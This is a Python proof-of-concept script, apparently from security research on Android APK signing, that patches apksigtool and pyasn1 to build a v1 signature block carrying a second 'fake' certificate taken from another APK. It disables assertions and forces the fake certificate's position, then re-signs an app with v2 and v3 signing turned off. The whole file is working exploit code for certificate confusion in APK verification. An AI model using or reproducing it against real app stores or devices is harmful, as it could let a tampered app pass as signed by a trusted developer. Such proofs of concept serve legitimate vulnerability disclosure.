#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool
import pyasn1.codec.cer.encoder as cer_encoder
import zipfile

from apksigtool import (                                        # type: ignore[attr-defined]
    JARSignatureFile, JARSignatureBlockFile, PrivKey, ECDSA, PKCS1v15,
    Halgo, PRIVKEY_TYPE, JAR_HASHERS_STR, DIGEST_ENCRYPTION_ALGORITHM,
    pyasn1_decode, pyasn1_encode, pyasn1_univ, rfc2315,
    create_signature, do_sign)
from typing import Optional, Tuple


# patched copy that doesn't sort setOf so we can reliably insert the fake cert
def encodeValue(self, value, asn1Spec, encodeFun, **options):   # type: ignore
    chunks = self._encodeComponents(
        value, asn1Spec, encodeFun, **options)
    return cer_encoder.null.join(chunks), True, True            # type: ignore


# patched copy that doesn't raise, just warns
def _assert(b: bool, what: Optional[str] = None) -> None:
    if not b:
        print("Assertion failed" + (f": {what}" if what else ""))


# patched copy that adds the fake cert
def _create_signature_block_file(sf: JARSignatureFile, *, cert: bytes, key: PrivKey,
                                 hash_algo: str) -> Tuple[bytes, str]:
    def halgo_f() -> Halgo:
        return ECDSA(halgo()) if alg == "EC" else halgo()       # type: ignore
    alg, = [e for c, e in PRIVKEY_TYPE.items() if isinstance(key, c)]
    oid, _, halgo = JAR_HASHERS_STR[hash_algo]
    dea = DIGEST_ENCRYPTION_ALGORITHM[alg][hash_algo]
    pad = PKCS1v15 if alg == "RSA" else None
    crt = pyasn1_decode(cert, asn1Spec=rfc2315.Certificate())[0]
    sig = create_signature(key, sf.raw_data, halgo_f, pad)
    sdat = rfc2315.SignedData()
    sdat["version"] = 1
    sdat["digestAlgorithms"][0]["algorithm"] = oid
    sdat["contentInfo"] = rfc2315.ContentInfo()
    sdat["contentInfo"]["contentType"] = rfc2315.ContentType(rfc2315.data)
    # --- BEGIN PATCH ---
    print("appending fake cert...")
    fake_crt = pyasn1_decode(fake_cert, asn1Spec=rfc2315.Certificate())[0]
    sdat["certificates"][0]["certificate"] = crt
    sdat["certificates"][1]["certificate"] = fake_crt
    # --- END PATCH ---
    sinf = sdat["signerInfos"][0]
    sinf["version"] = 1
    sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sinf["issuerAndSerialNumber"]["serialNumber"] = crt["tbsCertificate"]["serialNumber"]
    sinf["digestAlgorithm"]["algorithm"] = oid
    sinf["digestEncryptionAlgorithm"]["algorithm"] = dea
    sinf["encryptedDigest"] = sig
    cinf = rfc2315.ContentInfo()
    cinf["contentType"] = rfc2315.ContentType(rfc2315.signedData)
    cinf["content"] = pyasn1_univ.Any(pyasn1_encode(sdat))
    return pyasn1_encode(cinf), alg


cer_encoder.SetOfEncoder.encodeValue = encodeValue              # type: ignore
apksigtool._assert = _assert
apksigtool._create_signature_block_file = _create_signature_block_file

with zipfile.ZipFile("fake.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(info.filename)
            data = zf.read(info.filename)
            sbf = JARSignatureBlockFile(raw_data=data, filename=info.filename)
            fake_cert = sbf.certificate.dump()
            break

apksigcopier.copy_apk("app2.apk", "poc-unsigned.apk", exclude=apksigcopier.exclude_meta)

do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
        key="privkey-rsa.der", no_v2=True, no_v3=True)
